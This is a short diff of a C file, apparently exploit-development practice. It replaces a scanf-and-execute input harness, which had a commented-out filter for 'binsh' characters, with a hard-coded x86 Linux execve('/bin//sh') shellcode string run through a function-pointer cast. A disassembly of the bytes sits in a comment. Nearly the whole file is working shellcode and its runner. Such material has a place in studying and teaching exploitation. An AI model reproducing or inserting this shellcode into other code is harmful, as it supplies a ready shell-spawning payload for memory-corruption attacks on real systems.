@@ -1,8 +1,5 @@
 /*
 
-Workable Shellcode
-char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
-
 0804849c <_IO_stdin_used>:
  80484a0:	31 c0                	xor    %eax,%eax
  80484a2:	50                   	push   %eax
@@ -23,22 +20,9 @@ char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\
 
 int main()
 {
-    char alpha_bin[4096];
-    char invalid[]="BINSHbinsh";
+    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
-    scanf("%s", alpha_bin);
-
-/*
-    for(i = 0; i < strlen(invalid); i++) {
-        if(strchr(alpha_bin, invalid[i]) != NULL) {
-            puts("invalid input");
-            exit(0);
-        }
-    }
-*/
-
-
-    (*(void  (*)()) alpha_bin)();
+    (*(void  (*)()) shellcode)();
 
     return 0;
 }
